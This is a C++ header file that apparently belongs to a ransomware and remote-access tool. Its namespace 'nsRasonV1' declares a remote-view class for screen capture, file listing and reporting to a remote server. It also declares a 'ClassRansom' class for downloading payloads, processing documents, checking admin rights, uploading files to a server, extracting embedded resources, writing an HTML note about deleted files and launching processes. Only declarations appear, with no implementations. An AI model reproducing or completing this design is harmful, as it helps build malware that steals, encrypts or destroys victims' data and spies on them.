#pragma once
#include <iostream>
#include <string>
#include <windows.h>
using std::string;
using std::wstring;
namespace nsRasonV1
{
	class ClassRemoteView
	{
	public:
		ClassRemoteView(string strServerRemote);
		void vConnect(string strUser);		
	private:
		string strAsteriskToSpace(string strMessage);
		LPCTSTR strToLPCTSTR(const std::string& s);
		bool ScreenCapture(string strRutaTransmitir);
		bool isDir(string strRuta);		
		string strFixPath(string strMensaje);
		string listFiles(string strRuta);
		void sendReply(string strUser, string strMessage);		
		string strUnit();
		void vWrite(string strPath, string strContent);		
		string urlencode(const std::string &s);
	};
	class ClassRansom
	{
	public:
		ClassRansom();
		ClassRansom(string strServerRemote);		
		string strServer;
		bool bDownloadFile(string dirURL, string pathDestination);
		void vProcessDocs(string strDownFile);
		LPCWSTR strToLPCWSTR(const string& strURL);
		string wStringToString(const wstring& wstr);
		bool bProcess(string strPath);
		string strClientSocket(string strServer, string mensaje);
		string strMessageGet(string strServer, string varUsuario, string varLeer, string varRespuesta);
		bool bAdmin();
		string strUserRead(string strRuta);
		string varEnviroiment(const char *variable);
		bool listProcess(string strProcess);
	private:			
		
		void listFiles(string strRuta);
		string strFix(string &strCadena);
		string strSend(string strServer, string strUsuario, string strArchivo, string strContentToUp);
		string strLnk(string strRuta);		
		LPWSTR strToLPWSTR(string strCadena);
		LPWSTR myPath();
		bool fileExist(string strPath);
		bool bCopyFile(string strSource, string strDestination);
		bool extractResource(LPCWSTR pathDestiny, LPCWSTR nameResoruce, LPCWSTR typeResource);
		bool createHtml(string strFilesDelete, string strPathHtml, string strPathFile);
		void vRun(string strPath, string strParam, DWORD dTime);
	};
}
